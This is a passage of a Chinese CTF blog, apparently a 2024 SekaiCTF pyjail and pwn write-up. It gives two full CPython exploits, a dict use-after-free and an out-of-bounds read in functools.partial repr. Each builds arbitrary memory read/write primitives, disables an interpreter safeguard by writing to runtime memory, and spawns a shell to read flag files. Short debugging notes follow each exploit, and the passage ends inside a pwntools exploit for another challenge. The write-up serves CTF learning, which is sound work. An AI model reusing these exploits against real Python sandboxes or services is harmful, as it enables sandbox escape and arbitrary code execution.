class="hljs-keyword">def</span> <span class="hljs-title function_">rorfn</span>(<span class="hljs-params">self, other</span>):<br>    <span class="hljs-keyword">return</span> self.__or__(other)<br><br>t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br><br><span class="hljs-comment"># (PyByteArrayObject *) a-&gt;ob_bytes and</span><br><span class="hljs-comment"># (PyListObject *) b-&gt;ob_item now share the same memory</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>):<br>    b[<span class="hljs-number">0</span>] = obj<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_bytearray</span>(<span class="hljs-params">addr, size</span>):<br>    m = wrap(<span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x100</span>))<br>    m[<span class="hljs-number">0</span>] = <span class="hljs-number">3</span> <span class="hljs-comment"># refcnt</span><br>    m[<span class="hljs-number">1</span>] = addrof(<span class="hljs-built_in">bytearray</span>)<br>    m[<span class="hljs-number">2</span>] = size<br>    m[<span class="hljs-number">5</span>] = addr<br>    x = m.tobytes()<br>    a[<span class="hljs-number">0</span>] = addrof(x) + <span class="hljs-number">32</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arb_read</span>(<span class="hljs-params">addr</span>):<br>    fake_bytearray(addr, <span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> wrap(b[<span class="hljs-number">0</span>]).tolist().pop()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arb_write</span>(<span class="hljs-params">addr, value</span>):<br>    fake_bytearray(addr, <span class="hljs-number">8</span>)<br>    wrap(b[<span class="hljs-number">0</span>])[<span class="hljs-number">0</span>] = value<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>python_base = addrof(<span class="hljs-string">&#x27;a&#x27;</span>) - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br>arb_write(py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">import</span> os<br>os.execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag*&quot;</span>])<br><br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><ul><li><p>触发uaf之后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br><br><span class="hljs-comment"># (PyByteArrayObject *) a-&gt;ob_bytes and</span><br><span class="hljs-comment"># (PyListObject *) b-&gt;ob_item now share the same memory</span><br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/map1.png" class title="map1"><img src="/2024/08/31/sekai2024jailwp/t_a.png" class title="t_a"><img src="/2024/08/31/sekai2024jailwp/a_memoryview.png" class title="a_memoryview"><img src="/2024/08/31/sekai2024jailwp/b_list.png" class title="b_list"></li><li><p>addrof</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">addrof</span><span class="hljs-params">(obj)</span>:<br>    b[0] = obj<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/map2.png" class title="map2"></li><li><p>fake_bytearray</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_bytearray</span>(<span class="hljs-params">addr, size</span>):<br>    m = wrap(<span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x100</span>))<br>    m[<span class="hljs-number">0</span>] = <span class="hljs-number">3</span> <span class="hljs-comment"># refcnt</span><br>    m[<span class="hljs-number">1</span>] = addrof(<span class="hljs-built_in">bytearray</span>)<br>    m[<span class="hljs-number">2</span>] = size<br>    m[<span class="hljs-number">5</span>] = addr<br>    x = m.tobytes()<br>    a[<span class="hljs-number">0</span>] = addrof(x) + <span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/map3.png" class title="map3"><img src="/2024/08/31/sekai2024jailwp/m_bytearray.png" class title="m_bytearray"><img src="/2024/08/31/sekai2024jailwp/m_memoryview.png" class title="m_memoryview"><img src="/2024/08/31/sekai2024jailwp/x_bytes.png" class title="x_bytes"><img src="/2024/08/31/sekai2024jailwp/fake_byte_array.png" class title="fake_byte_array"></li></ul><h2 id="利用partial-repr的index越界"><a href="#利用partial-repr的index越界" class="headerlink" title="利用partial_repr的index越界"></a>利用partial_repr的index越界</h2><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># based on chilaxans functools exp</span><br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial<br><span class="hljs-keyword">import</span> sys<br><br>length = <span class="hljs-number">119</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pair</span>():<br>    <span class="hljs-comment"># heap grooming</span><br>    <span class="hljs-comment"># returns tuple, bytearray pair where array exists directly after end of tuple</span><br>    fill = <span class="hljs-built_in">bytes</span>((length // <span class="hljs-number">2</span>) * <span class="hljs-built_in">tuple</span>.__itemsize__)<br>    r = <span class="hljs-built_in">range</span>((length // <span class="hljs-number">2</span>) - <span class="hljs-number">5</span>)  <span class="hljs-comment"># do these now so that we need less allocs later</span><br>    old = []  <span class="hljs-comment"># store failures to increase memory pressure</span><br>    t0 = <span class="hljs-built_in">tuple</span>(r)<br>    b0 = <span class="hljs-built_in">bytearray</span>(fill)<br>    t1 = <span class="hljs-built_in">tuple</span>(r)<br>    b1 = <span class="hljs-built_in">bytearray</span>(fill)<br>    t = <span class="hljs-built_in">tuple</span>(r)<br>    b = <span class="hljs-built_in">bytearray</span>(fill)<br>    <span class="hljs-keyword">return</span> t, b<br><br><br>p = partial(<span class="hljs-built_in">id</span>)<br><br>bytearray_mem = <span class="hljs-built_in">memoryview</span>(<span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytearray</span>.__basicsize__)).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>bytearray_mem[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># refcount</span><br>bytearray_mem[<span class="hljs-number">1</span>] = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">bytearray</span>.__call__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  <span class="hljs-comment"># ob_type</span><br>bytearray_mem[<span class="hljs-number">2</span>] = (<span class="hljs-number">2</span> ** (<span class="hljs-built_in">tuple</span>.__itemsize__ * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>  <span class="hljs-comment"># ob_size</span><br>bytearray_mem = bytearray_mem.tobytes()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br><br><br>Fake_mem = <span class="hljs-built_in">memoryview</span>(<span class="hljs-built_in">bytearray</span>(Fake.__basicsize__)).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>Fake_mem[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># refcount</span><br>Fake_mem[<span class="hljs-number">1</span>] = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake.__call__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  <span class="hljs-comment"># ob_type</span><br>Fake_mem[<span class="hljs-number">2</span>] = (<br>    <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;bytearray_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">bytes</span>.__basicsize__ - <span class="hljs-number">1</span><br>)<br>Fake_mem = Fake_mem.tobytes()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeirdRepr</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> b  <span class="hljs-comment"># otherwise it is freed after function and that causes more problems</span><br>        t, b = make_pair()<br>        p.__setstate__((<span class="hljs-built_in">id</span>, t, &#123;&#125;, &#123;&#125;))<br>        mem = <span class="hljs-built_in">memoryview</span>(b).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mem)):<br>            mem[i] = (<br>                <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                + <span class="hljs-built_in">bytes</span>.__basicsize__<br>                - <span class="hljs-number">1</span><br>            )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wack&quot;</span><br><br><br>p.__setstate__((<span class="hljs-built_in">id</span>, (WeirdRepr(),) * length, &#123;&#125;, &#123;&#125;))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">repr</span>(p)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    mem = e.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">import</span> sys<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>a_addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;a&#x27;</span>.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>python_base = a_addr - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br>ob_idx = py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span><br><br>mem[ob_idx : ob_idx + <span class="hljs-number">8</span>] = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>] * <span class="hljs-number">8</span>)<br><span class="hljs-keyword">import</span> os<br><br>os.system(<span class="hljs-string">&quot;cat /flag*.txt&quot;</span>)<br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure><h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><ul><li><p>repr用于返回一个对象的“官方”字符串表示形式，自定义对象可以定义__repr__自定义实现</p></li><li><p>functools.partial可用于包装函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fa</span>(<span class="hljs-params">a, b, c</span>):<br>    <span class="hljs-keyword">return</span> a + b + c<br><br>p = partial(fa, <span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure></li><li><p>partial的repr由partial_repr函数实现，有这么一部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">assert (PyTuple_Check(pto-&gt;args));<br>n = PyTuple_GET_SIZE(pto-&gt;args);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    Py_SETREF(arglist, PyUnicode_FromFormat(<span class="hljs-string">&quot;%U, %R&quot;</span>, arglist,<br>                                    PyTuple_GET_ITEM(pto-&gt;args, i)));<br>    <span class="hljs-keyword">if</span> (arglist == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">goto</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>遍历pto-&gt;args元组，获取其中的PyObject</li><li>PyUnicode_FromFormat会递归调用pto-&gt;args[i]的__repr__</li></ul></li></ul><p>如果此时修改pto-&gt;args，改为一个更小的元组就会造成index越界</p><ul><li><p>先利用bytearray_mem伪造一个PyByteArrayObject</p><img src="/2024/08/31/sekai2024jailwp/bytearray_mem1.png" class title="bytearray_mem1"><img src="/2024/08/31/sekai2024jailwp/bytearray_mem2.png" class title="bytearray_mem2"></li><li><p>再利用Fake_mem伪造一个Fake PyObject</p><img src="/2024/08/31/sekai2024jailwp/fake_mem1.png" class title="fake_mem1"><img src="/2024/08/31/sekai2024jailwp/fake_mem2.png" class title="fake_mem2"><ul><li><p>class Fake的value属性是__slots__的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br></code></pre></td></tr></table></figure></li><li><p>这个属性直接存储在PyObject之后</p><img src="/2024/08/31/sekai2024jailwp/fake_mem3.png" class title="fake_mem3"></li></ul></li><li><p>functools.partial的__repr__使用partial_repr实现，__setstate__使用partial_setstate实现</p><ul><li><p>首先将args填满class WeirdRepr，大小为119</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.__setstate__((<span class="hljs-built_in">id</span>, (WeirdRepr(),) * length, &#123;&#125;, &#123;&#125;))<br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/fake_buffer0.png" class title="fake_buffer"></li><li><p>repr(p)时会调用WeirdRepr.__repr__，将args改为大小54的元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pair</span>():<br>    fill = <span class="hljs-built_in">bytes</span>((length // <span class="hljs-number">2</span>) * <span class="hljs-built_in">tuple</span>.__itemsize__)<br>    r = <span class="hljs-built_in">range</span>((length // <span class="hljs-number">2</span>) - <span class="hljs-number">5</span>)<br>    <br><span class="hljs-comment"># ……</span><br>    <br>    t = <span class="hljs-built_in">tuple</span>(r)<br>    b = <span class="hljs-built_in">bytearray</span>(fill)<br>    <span class="hljs-keyword">return</span> t, b<br></code></pre></td></tr></table></figure><ul><li><p>元组内容为PyLongObject 1 2 3 4……</p><img src="/2024/08/31/sekai2024jailwp/fake_buffer1.png" class title="fake_buffer1"></li><li><p>这个元组之后跟的就是PyByteArrayObject的buf</p><img src="/2024/08/31/sekai2024jailwp/fake_buffer2.png" class title="fake_buffer2"><p>这部分内存之后被填满了指向Fake_mem的指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeirdRepr</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> b<br>        t, b = make_pair()<br>        p.__setstate__((<span class="hljs-built_in">id</span>, t, &#123;&#125;, &#123;&#125;))<br>        mem = <span class="hljs-built_in">memoryview</span>(b).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mem)):<br>            mem[i] = (<br>                <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                + <span class="hljs-built_in">bytes</span>.__basicsize__<br>                - <span class="hljs-number">1</span><br>            )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wack&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>再回到partial_repr，此时args已被修改，越界对Fake调用__repr__</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br></code></pre></td></tr></table></figure><p>Fake.value经过伪造指向fake bytearray，通过try expect就获取到了这个ob_size为0x7fffffffffffffff的PyByteArrayObject，可以对内存进行任意读写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">repr</span>(p)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    mem = e.args[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>pyjail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 sekaiCTF pwn wp part1</title>
    <link href="/2024/08/27/sekai2024pwnwp/"/>
    <url>/2024/08/27/sekai2024pwnwp/</url>
    
    <content type="html"><![CDATA[<p>成功解锁成就——一个暑假两个月每个周末都在打比赛</p><span id="more"></span><h1 id="Life-Simulator-2"><a href="#Life-Simulator-2" class="headerlink" title="Life Simulator 2"></a>Life Simulator 2</h1><p>搓了一天的类型混淆</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg= <span class="hljs-keyword">lambda</span> name,data :p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;./life_simulator_2&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_company</span>(<span class="hljs-params">company_name, company_budget</span>):<br>    sl(<span class="hljs-string">&#x27;add_company &#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(company_name, company_budget))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sell_company</span>(<span class="hljs-params">company_name</span>):<br>    sl(<span class="hljs-string">&#x27;sell_company &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(company_name))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_projct</span>(<span class="hljs-params">company_name, project_name, project_profit_per_week</span>):<br>    sl(<span class="hljs-string">&#x27;add_project &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([company_name, project_name, <span 